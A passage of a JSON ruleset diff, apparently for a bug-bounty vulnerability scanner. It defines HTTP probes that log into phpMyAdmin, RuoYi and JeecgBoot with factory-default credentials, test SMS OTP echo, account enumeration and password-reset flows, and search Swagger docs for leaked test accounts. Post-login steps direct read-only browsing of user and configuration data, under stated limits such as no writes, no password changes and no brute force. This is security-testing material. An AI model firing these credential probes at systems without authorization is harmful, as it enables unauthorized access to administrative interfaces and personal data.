+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "pma_username=root&pma_password="
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "database",
+          "Server version"
+        ]
+      },
+      "next": "命中说明 MySQL root 可空口令直连管理界面（高危）；登录后只读浏览 database 列表取证，按实际危害提交；严禁执行任何 SQL 写操作",
+      "harmless_note": "仅提交 root+空口令一次（MySQL 安装文档的出厂默认态），非爆破；命中后只读浏览"
+    },
+    {
+      "id": "ruoyi-default-cred-check",
+      "fingerprint": "framework_ruoyi",
+      "fallback_title_kw": [
+        "若依",
+        "ruoyi"
+      ],
+      "name": "若依框架出厂默认口令核查（admin/admin123，仅默认值）",
+      "vuln_type": "default_credential",
+      "severity_hint": "medium",
+      "check": {
+        "method": "POST",
+        "path": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"username\":\"admin\",\"password\":\"admin123\",\"code\":\"\",\"uuid\":\"\"}"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "token",
+          "操作成功"
+        ]
+      },
+      "next": "命中说明默认管理员口令未改（验证码关闭时才可能命中）；登录态后只读深挖用户/角色/配置接口，实证敏感数据后提交；严禁改密",
+      "harmless_note": "仅提交若依官方文档的出厂默认组合 admin/admin123 一次，非爆破不遍历"
+    },
+    {
+      "id": "jeecg-default-cred-check",
+      "fingerprint": "framework_jeecg",
+      "fallback_title_kw": [
+        "jeecg"
+      ],
+      "name": "JeecgBoot 出厂默认口令核查（jeecg/jeecg@2023，仅默认值）",
+      "vuln_type": "default_credential",
+      "severity_hint": "medium",
+      "check": {
+        "method": "POST",
+        "path": "/sys/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"username\":\"jeecg\",\"password\":\"jeecg@2023\",\"captcha\":\"\",\"checkKey\":\"\"}"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "token",
+          "success"
+        ]
+      },
+      "next": "命中说明演示默认账号未删（JeecgBoot 文档明示的出厂账号）；登录态只读深挖在线用户/系统配置，实证后提交；严禁改密",
+      "harmless_note": "仅提交 JeecgBoot 官方文档的出厂演示账号一次，非爆破"
+    },
+    {
+      "id": "sms-otp-echo-check",
+      "fingerprint": "sso_cas",
+      "fallback_title_kw": [
+        "短信验证码",
+        "短信登录"
+      ],
+      "name": "短信验证码 OTP 明文回显检测（任意用户登录/改密前置）",
+      "vuln_type": "captcha_bypass",
+      "severity_hint": "high",
+      "check": {
+        "method": "POST",
+        "path": "/sms/send",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"phone\":\"13800000000\",\"type\":\"login\"}"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "code",
+          "验证码"
+        ]
+      },
+      "next": "检查响应 body 是否直接包含 6 位数字验证码（明文回显）——能读到发往手机的 OTP 即中危~高危（可任意用户登录/改密）；只用 13800000000 测试号段，绝不用真实用户手机号；图形/算术验证码回显不算，只有短信 OTP 回显才算",
+      "harmless_note": "只对测试号段发一次短信验证码请求并检查响应是否回显 OTP；不尝试登录任何账号，不猜验证码"
+    },
+    {
+      "id": "login-enum-diff-check",
+      "fingerprint": "sso_cas",
+      "fallback_title_kw": [],
+      "name": "登录接口账号枚举差异检测（响应差异分析，不猜口令）",
+      "vuln_type": "info_probe",
+      "severity_hint": "low",
+      "check": {
+        "method": "POST",
+        "path": "/login",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "username=__nonexist_probe_0000__&password=__random_probe__"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "用户不存在",
+          "账号不存在",
+          "密码错误",
+          "用户名或密码"
+        ]
+      },
+      "next": "记录响应文案：'用户不存在'与'密码错误'有差异说明可枚举有效账号（低价值仅记录线索，本身不提交）；重点转向密码找回/改绑逻辑测试",
+      "harmless_note": "仅提交一个明显不存在的探测账号名一次，观察响应差异；不提交真实用户名、不尝试任何口令"
+    },
+    {
+      "id": "password-reset-logic-check",
+      "fingerprint": "sso_cas",
+      "fallback_title_kw": [
+        "找回密码",
+        "忘记密码",
+        "reset"
+      ],
+      "name": "密码找回接口逻辑缺陷探测（流程分析，不实际重置）",
+      "vuln_type": "info_probe",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/resetPassword?username=__probe__"
+      },
+      "match": {
+        "status_in": [
+          200,
+          302
+        ],
+        "body_contains_any": [
+          "验证码",
+          "token",
+          "reset",
+          "新密码"
+        ]
+      },
+      "next": "分析找回流程：验证码是否前端可读、token 是否可预测、是否可直接跳到设置新密码步骤；只做流程分析记录线索，严禁实际重置任何账号密码（红线）",
+      "harmless_note": "只读浏览找回密码页面/流程，不提交重置请求、不改任何密码"
+    },
+    {
+      "id": "swagger-cred-config-check",
+      "fingerprint": "api_swagger",
+      "fallback_title_kw": [
+        "swagger"
+      ],
+      "name": "Swagger 文档中默认凭证/测试账号泄露检测",
+      "vuln_type": "unauthorized_access",
+      "severity_hint": "medium",
+      "check": {
+        "method": "GET",
+        "path": "/v2/api-docs"
+      },
+      "match": {
+        "status_in": [
+          200
+        ],
+        "body_contains_any": [
+          "password",
+          "admin",
+          "test",
+          "123456"
+        ]
+      },
+      "next": "从接口文档 definitions/examples 里搜默认测试账号（如 admin/123456 出现在示例值）——只记录线索；使用文档明示的测试账号登录属可接受范围，但登录后必须继续深挖到死规矩数据才算洞；严禁猜测遍历",
+      "harmless_note": "GET 只读文档，检测示例值中是否有文档自带的测试凭证；不遍历口令"
+    }
+  ]
+}
